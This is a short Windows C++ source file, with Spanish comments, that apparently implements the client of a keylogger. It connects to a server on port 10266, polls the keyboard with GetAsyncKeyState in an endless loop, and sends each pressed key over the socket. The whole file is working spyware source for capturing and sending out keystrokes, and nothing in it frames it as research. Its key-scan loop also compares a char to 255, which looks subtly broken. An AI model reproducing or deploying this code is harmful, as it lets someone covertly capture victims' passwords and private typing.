#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <cstring>
#include "errors.hpp"
#include "connection.hpp"
#pragma comment(lib, "Ws2_32.lib")
#pragma once

#define port "10266"

int main()
{
    WSADATA wsadata;
    int r = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (r != 0)
    {
        WSACleanup();
        error("no se pudo inicializar Windows Socket API", WSAGetLastError());
    }
    SOCKET server = connect_server(port);
    if (server == INVALID_SOCKET)
    {
        error("no hay ningun server al cual conectarse", WSAGetLastError());
    }
    while (true)
    {
        // Pasar por todos los caracteres ASCII
        for (char i = 8; i <= 255; i++)
        {
            // si fue apretado (minimo valor entero)
            if (GetAsyncKeyState(i) == -32767)
            {
                send(server,&i,1,NULL);
            }
        }
    }
}